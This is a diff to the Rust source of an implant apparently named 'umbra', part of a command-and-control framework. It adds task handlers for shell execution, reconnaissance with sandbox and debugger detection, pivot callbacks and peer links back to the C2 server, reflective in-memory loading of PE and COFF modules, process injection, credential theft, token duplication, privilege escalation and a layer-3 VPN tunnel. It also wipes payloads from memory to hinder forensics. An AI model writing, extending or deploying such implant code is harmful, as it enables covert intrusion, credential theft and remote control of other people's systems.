@@ -293,16 +293,34 @@ pub fn upload(path: &str, offset: u64, data: &[u8], eof: bool) -> Outcome {
     outcome
 }
 
+/// The context a task may need: the implant's identity and its C2 address.
+///
+/// Most tasks do not need it, but the ones that open a channel back to the
+/// team server (a pivot callback, a peer link, the layer-3 tunnel) cannot
+/// work without it.
+#[derive(Clone)]
+pub struct Context {
+    /// The agent pre-shared key.
+    pub psk: Vec<u8>,
+    /// The implant identity.
+    pub agent_id: String,
+    /// The C2 address ("host:port").
+    pub server: String,
+    /// Whether the implant prints what it is doing.
+    pub verbose: bool,
+}
+
 /// Execute one task. `sleep`/`exit` are handled by the beacon loop itself, so
 /// they are only reported here for completeness.
-pub fn run(kind: &str, args: &Value) -> Outcome {
+pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
     match kind {
         "shell" | "exec" => {
             let cmd = args.str_or("cmd", "");
             let timeout = args.u64_or("timeout", 120);
             shell(&cmd, timeout)
         }
-        "sysinfo" | "recon" => Outcome::ok(sysinfo::report().into_bytes()),
+        "sysinfo" => Outcome::ok(sysinfo::report().into_bytes()),
+        "recon" => Outcome::ok(recon_report().into_bytes()),
         "pwd" | "cwd" => match std::env::current_dir() {
             Ok(p) => Outcome::ok(format!("{}\n", p.display()).into_bytes()),
             Err(e) => Outcome::err(1, format!("cwd: {e}")),
@@ -358,7 +376,223 @@ pub fn run(kind: &str, args: &Value) -> Outcome {
         "sleep" => Outcome::ok(b"sleep interval updated\n".to_vec()),
         "exit" | "kill" => Outcome::ok(b"beacon exiting\n".to_vec()),
         "ping" => Outcome::ok(b"pong\n".to_vec()),
+
+        // ---- pivoting -------------------------------------------------
+        "tunnel" => open_tunnel(ctx, args),
+        "p2p" => peer_link(ctx, args),
+
+        // ---- in-memory execution ---------------------------------------
+        "bof" => run_module(args),
+        "ext" => run_module(args),
+        "inject" => inject(args),
+        "creds" => match crate::post::creds(&args.str_or("mode", "")) {
+            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "token" => match crate::post::token(peer_pid(args)) {
+            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        "privesc" => match crate::post::privesc(&args.str_or("mode", "")) {
+            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+
+        // ---- layer-3 tunnel ---------------------------------------------
+        "vpn" => start_vpn(ctx, args),
+
         other => Outcome::err(2, format!("unknown task kind {other:?}")),
+    }
+}
+
+/// The reconnaissance report.
+///
+/// It is the host facts, the environment findings (a debugger, a sandbox) and
+/// the domain edges, in that order: from "where am I" to "who else is here".
+fn recon_report() -> String {
+    let mut out = String::new();
+    out.push_str(&sysinfo::report());
+    out.push_str(&crate::evade::report());
+    out.push_str(&crate::domain::report());
+    out
+}
+
+/// Open a pivot callback session.
+///
+/// The callback runs in the background: the beacon must keep beaconing while
+/// the tunnel is open, so the task only reports that the session was started.
+fn open_tunnel(ctx: &Context, args: &Value) -> Outcome {
+    let stream = args.str_or("stream", "");
+    if stream.is_empty() {
+        return Outcome::err(1, "tunnel requires args.stream");
+    }
+    let context = ctx.clone();
+    let id = stream.clone();
+    thread::spawn(move || {
+        loop {
+            let result = crate::tunnel::open_callback(
+                &context.server,
+                &context.psk,
+                &context.agent_id,
+                &id,
+                context.verbose,
+            );
+            match result {
+                Ok(()) => {}
+                Err(e) => {
+                    if context.verbose {
+                        eprintln!("[umbra] tunnel callback failed: {e}");
+                    }
+                }
+            }
+            // Back off before reconnecting: the server asked for this
+            // session, so it is worth retrying, but not in a tight loop.
+            thread::sleep(Duration::from_secs(15));
+        }
+    });
+    Outcome::ok(format!("tunnel session {stream} opened\n").into_bytes())
+        .with("stream", upk::s(&stream))
+}
+
+/// Open or listen for a peer-to-peer pivot link.
+fn peer_link(ctx: &Context, args: &Value) -> Outcome {
+    let action = args.str_or("action", "connect");
+    let host = args.str_or("host", "");
+    let port = args.u64_or("port", 0);
+    let context = ctx.clone();
+    match action.as_str() {
+        "listen" => {
+            let bind = if host.is_empty() {
+                format!("0.0.0.0:{}", port)
+            } else {
+                format!("{host}:{port}")
+            };
+            thread::spawn(move || {
+                if let Err(e) = crate::tunnel::listen_peer(
+                    &bind,
+                    &context.psk,
+                    &context.agent_id,
+                    context.verbose,
+                ) {
+                    if context.verbose {
+                        eprintln!("[umbra] p2p listener failed: {e}");
+                    }
+                }
+            });
+            Outcome::ok(format!("p2p listener on {bind}\n").into_bytes())
+                .with("bind", upk::s(&bind))
+        }
+        "connect" | "" => {
+            if host.is_empty() || port == 0 {
+                return Outcome::err(1, "p2p requires args.host and args.port");
+            }
+            thread::spawn(move || loop {
+                let result = crate::tunnel::connect_peer(
+                    &host,
+                    port as u16,
+                    &context.psk,
+                    &context.agent_id,
+                    context.verbose,
+                );
+                if context.verbose {
+                    match result {
+                        Ok(()) => {}
+                        Err(e) => eprintln!("[umbra] p2p link failed: {e}"),
+                    }
+                }
+                thread::sleep(Duration::from_secs(15));
+            });
+            Outcome::ok(format!("p2p link to {host}:{port} opened\n").into_bytes())
+                .with("host", upk::s(&host))
+                .with("port", upk::u(port))
+        }
+        other => Outcome::err(1, format!("unknown p2p action {other:?}")),
+    }
+}
+
+/// Run a module in memory: a COFF object or a PE image.
+fn run_module(args: &Value) -> Outcome {
+    let name = args.str_or("name", "module");
+    let mut data = args.bin_or("data", b"");
+    if data.is_empty() {
+        return Outcome::err(1, "the module is empty");
+    }
+    let module_args = crate::bof::parse_args(args.get("args").unwrap_or(&Value::Null));
+    let result = if data.starts_with(b"MZ") {
+        // A PE image: run it in this process through the reflective loader.
+        crate::post::reflective_load(&data)
+    } else {
+        crate::bof::run(&data, &module_args).map(|loaded| crate::post::Outcome {
+            report: format!("module {name} returned {}", loaded.code),
+            material: loaded.output,
+        })
+    };
+    // The module image has served its purpose: the bytes are wiped so a
+    // memory dump of the implant does not hand the module back.
+    crate::crypto::zeroize(&mut data);
+    match result {
+        Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+        Err(e) => Outcome::err(1, e),
+    }
+}
+
+/// Inject a payload into a process.
+fn inject(args: &Value) -> Outcome {
+    let pid = args.u64_or("pid", 0) as u32;
+    if pid == 0 {
+        return Outcome::err(1, "inject requires args.pid");
+    }
+    let mode = args.str_or("mode", "reflect");
+    let mut payload = args.bin_or("data", b"");
+    let result = crate::post::inject(pid, &mode, &payload);
+    // The payload leaves no copy in the implant.
+    crate::crypto::zeroize(&mut payload);
+    match result {
+        Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+        Err(e) => Outcome::err(1, e),
+    }
+}
+
+/// The process whose token is duplicated.
+fn peer_pid(args: &Value) -> Option<u32> {
+    let pid = args.u64_or("pid", 0);
+    if pid == 0 {
+        None
+    } else {
+        Some(pid as u32)
+    }
+}
+
+/// Join the layer-3 tunnel.
+fn start_vpn(ctx: &Context, args: &Value) -> Outcome {
+    let action = args.str_or("action", "start");
+    if action != "start" {
+        return Outcome::ok(format!("vpn {action}\n").into_bytes());
+    }
+    let server = {
+        let explicit = args.str_or("addr", "");
+        if explicit.is_empty() {
+            ctx.server.clone()
+        } else {
+            explicit
+        }
+    };
+    let context = ctx.clone();
+    let (tx, rx) = mpsc::channel::<String>();
+    thread::spawn(move || {
+        let result = crate::vpn::serve(&server, &context.psk, &context.agent_id, context.verbose);
+        let _ = tx.send(match result {
+            Ok(address) => address,
+            Err(e) => format!("error: {e}"),
+        });
+    });
+    match rx.recv_timeout(Duration::from_secs(20)) {
+        Ok(address) if !address.starts_with("error:") => {
+            Outcome::ok(format!("vpn tunnel joined as {address}\n").into_bytes())
+                .with("address", upk::s(&address))
+        }
+        Ok(address) => Outcome::err(1, address),
+        Err(_) => Outcome::err(1, "the tunnel did not answer in time"),
     }
 }
 
